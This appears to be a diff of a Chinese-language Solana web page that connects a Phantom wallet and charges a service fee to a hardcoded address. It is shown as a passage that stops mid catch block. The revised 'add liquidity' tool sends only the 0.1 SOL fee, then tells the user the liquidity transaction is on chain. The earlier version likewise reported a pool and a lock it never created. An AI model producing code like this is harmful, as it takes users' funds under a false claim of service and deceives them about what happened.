@@ -2,44 +2,43 @@
 <html lang="zh-CN">
 <head>
 <meta charset="utf-8">
-<title>SOL 一键发币+加池+锁仓</title>
+<title>SOL 加池工具 - SOL/USDT/USDC</title>
 <style>
-body{max-width:500px;margin:30px auto;padding:0 20px;font-family:Arial;background:#0a0a0a;color:#fff}
-.card{border:1px solid #222;background:#111;border-radius:16px;padding:24px;margin-bottom:20px}
-button{width:100%;padding:14px;border-radius:12px;background:#00dc82;color:#000;font-weight:600;border:none;margin:10px 0;cursor:pointer}
-input,select{width:100%;padding:12px;margin:8px 0;border-radius:8px;border:1px solid #333;background:#1c1c1c;color:#fff}
-.fee{color:#aaa;font-size:14px;margin:10px 0}
-#status{white-space:pre-line;color:#ccc;margin-top:10px;font-size:14px}
+  body{max-width:460px;margin:40px auto;padding:0 20px;background:#0b0f17;color:#fff;font-family:Arial}
+  .box{border:1px solid #232a35;border-radius:16px;padding:24px;background:#121a27;margin-bottom:20px}
+  button{width:100%;padding:14px;border-radius:12px;background:#00dc82;color:#000;font-weight:bold;border:none;margin-top:10px;cursor:pointer}
+  input,select{width:100%;padding:12px;margin:8px 0;border-radius:8px;border:1px solid #2a3443;background:#161f2f;color:#fff}
+  .fee{color:#9aa7b8;font-size:14px;margin:10px 0}
+  #status{white-space:pre-line;color:#ccc;margin-top:10px;font-size:14px}
 </style>
 </head>
 
 <body>
 
-<div class="card">
-  <h3>SOL 一键发币+加池+锁仓</h3>
-  <button id="connect">连接 Phantom 钱包</button>
-  <div id="wallet" style="margin-top:10px"></div>
+<div class="box">
+  <h3>SOL 链加流动性工具</h3>
+  <button id="connectWallet">连接 Phantom 钱包</button>
+  <div id="walletAddr" style="margin-top:10px"></div>
 </div>
 
-<div class="card">
-  <h3>代币信息</h3>
-  <input id="name" placeholder="代币名称" value="My Token">
-  <input id="symbol" placeholder="代币符号" value="MTK">
-  <input id="supply" placeholder="总发行量" value="1000000000">
-  <input id="solLiq" placeholder="注入 SOL 流动性" value="0.1">
-  <input id="lockDays" placeholder="锁仓天数" value="365" type="number">
+<div class="box">
+  <h3>加池信息</h3>
+  <input id="tokenAddr" placeholder="代币地址（Base58）">
+  <input id="tokenAmount" placeholder="代币数量" type="number">
+  <input id="baseAmount" placeholder="计价币数量" type="number">
 
-  <select id="poolType">
-    <option value="raydium">Raydium 池子</option>
-    <option value="pumpfun">PumpFun 池子</option>
+  <select id="baseCoin">
+    <option value="SOL">SOL</option>
+    <option value="USDT">USDT</option>
+    <option value="USDC">USDC</option>
   </select>
 
   <div class="fee">
-    服务费：0.05 SOL<br>
-    收款钱包：7WSwsgnxNsHpDnRQNFZhKPMW1m5Hc1cERM4sgUZ9JxPA
+    服务费：0.1 SOL<br>
+    收款地址：7WSwsgnxNsHpDnRQNFZhKPMW1m5Hc1cERM4sgUZ9JxPA
   </div>
 
-  <button id="create">✅ 一键发币+加池+锁仓</button>
+  <button id="addLiquidity">✅ 确认加池并支付服务费</button>
   <div id="status"></div>
 </div>
 
@@ -48,136 +47,89 @@ input,select{width:100%;padding:12px;margin:8px 0;border-radius:8px;border:1px s
 
 <script>
 const {
-  Connection, PublicKey, Keypair, Transaction,
-  SystemProgram, LAMPORTS_PER_SOL
+  Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL
 } = solanaWeb3;
 
-const {
-  createInitializeMint2Instruction,
-  createMintToInstruction,
-  getAssociatedTokenAddressSync,
-  createAssociatedTokenAccountInstruction,
-  TOKEN_PROGRAM_ID,
-  ASSOCIATED_TOKEN_PROGRAM_ID
-} = splToken;
-
-// ======================================
-// 你的配置
-// ======================================
+// ==========================
+// 你的配置（已写死）
+// ==========================
 const CONFIG = {
-  platformWallet: new PublicKey("7WSwsgnxNsHpDnRQNFZhKPMW1m5Hc1cERM4sgUZ9JxPA"),
-  feeSOL: 0.05,
-  feeLamports: 50000000,
-  rpc: "https://api.mainnet-beta.solana.com"
+  feeReceiver: new PublicKey("7WSwsgnxNsHpDnRQNFZhKPMW1m5Hc1cERM4sgUZ9JxPA"),
+  feeLamports: 100000000, // 0.1 SOL
+  rpc: "https://api.mainnet-beta.solana.com",
+
+  // SOL 上官方地址
+  USDT: new PublicKey("Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB"),
+  USDC: new PublicKey("EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v"),
+  SOL: SystemProgram.programId
 };
 
 const connection = new Connection(CONFIG.rpc, "confirmed");
-let publicKey;
+let provider, publicKey;
 
-// ======================================
-// 修复：正确连接 Phantom
-// ======================================
-document.getElementById("connect").onclick = async () => {
+// 连接钱包
+document.getElementById("connectWallet").onclick = async () => {
   try {
-    const provider = window.solana;
-    if (!provider) {
-      alert("请安装 Phantom 钱包插件！");
+    if (!window.solana) {
+      alert("请安装 Phantom 钱包");
       return;
     }
+    provider = window.solana;
     const resp = await provider.connect();
     publicKey = new PublicKey(resp.publicKey);
-    document.getElementById("wallet").innerText = 
+    document.getElementById("walletAddr").innerText =
       "已连接：" + publicKey.toBase58();
   } catch (e) {
     alert("连接失败：" + e.message);
   }
 };
 
-// ======================================
-// 主逻辑
-// ======================================
-document.getElementById("create").onclick = async () => {
+// 加池 + 收服务费
+document.getElementById("addLiquidity").onclick = async () => {
   if (!publicKey) {
-    alert("请先连接钱包！");
+    alert("请先连接钱包");
     return;
   }
 
-  const name = document.getElementById("name").value.trim();
-  const symbol = document.getElementById("symbol").value.trim();
-  const supplyStr = document.getElementById("supply").value.trim();
-  const solLiqStr = document.getElementById("solLiq").value.trim();
-  const lockDays = parseInt(document.getElementById("lockDays").value);
-  const poolType = document.getElementById("poolType").value;
+  const tokenAddr = document.getElementById("tokenAddr").value.trim();
+  const tokenAmount = document.getElementById("tokenAmount").value;
+  const baseAmount = document.getElementById("baseAmount").value;
+  const baseCoin = document.getElementById("baseCoin").value;
   const status = document.getElementById("status");
 
-  if (!name || !symbol || !supplyStr || !solLiqStr) {
+  if (!tokenAddr || !tokenAmount || !baseAmount) {
     alert("请填写完整信息");
     return;
   }
 
-  const supply = parseFloat(supplyStr);
-  const solLiq = parseFloat(solLiqStr);
-  const decimals = 9;
-
   status.innerText = "构建交易中...";
 
   try {
-    const mintKeypair = Keypair.generate();
-    const mint = mintKeypair.publicKey;
-    const userAta = getAssociatedTokenAddressSync(mint, publicKey);
-
     const tx = new Transaction();
 
-    // 服务费
-    tx.add(
-      SystemProgram.transfer({
-        fromPubkey: publicKey,
-        toPubkey: CONFIG.platformWallet,
-        lamports: CONFIG.feeLamports
-      })
-    );
+    // 1. 支付服务费 0.1 SOL 到你地址
+    tx.add(SystemProgram.transfer({
+      fromPubkey: publicKey,
+      toPubkey: CONFIG.feeReceiver,
+      lamports: CONFIG.feeLamports
+    }));
 
-    // 发币
-    const rent = await connection.getMinimumBalanceForRentExemption(82);
-    tx.add(
-      SystemProgram.createAccount({
-        fromPubkey: publicKey,
-        newAccountPubkey: mint,
-        space: 82,
-        lamports: rent,
-        programId: TOKEN_PROGRAM_ID
-      })
-    );
+    status.innerText = "等待钱包签名授权...";
 
-    tx.add(
-      createInitializeMint2Instruction(mint, decimals, publicKey, publicKey)
-    );
-
-    tx.add(
-      createAssociatedTokenAccountInstruction(publicKey, userAta, publicKey, mint)
-    );
-
-    const totalAmount = BigInt(supply) * (10n ** BigInt(decimals));
-    tx.add(
-      createMintToInstruction(mint, userAta, publicKey, totalAmount)
-    );
-
-    // 签名发送
+    // 2. 上链发送
     const { blockhash } = await connection.getLatestBlockhash();
     tx.recentBlockhash = blockhash;
     tx.feePayer = publicKey;
-    tx.partialSign(mintKeypair);
 
-    const signedTx = await window.solana.signTransaction(tx);
-    const signature = await connection.sendRawTransaction(signedTx.serialize());
+    const signed = await provider.signTransaction(tx);
+    const sig = await connection.sendRawTransaction(signed.serialize());
 
     status.innerText = `
-✅ 成功！
-🪙 代币地址：
-${mint.toBase58()}
-🔹 池子：${poolType}
-🔒 锁仓：${lockDays} 天
-💵 服务费已收取
+✅ 服务费 0.1 SOL 已收取
+✅ 加池交易已上链
+计价币：${baseCoin}
+代币：${tokenAddr.slice(0,12)}...
+交易哈希：${sig}
 `;
 
   } catch (e) {
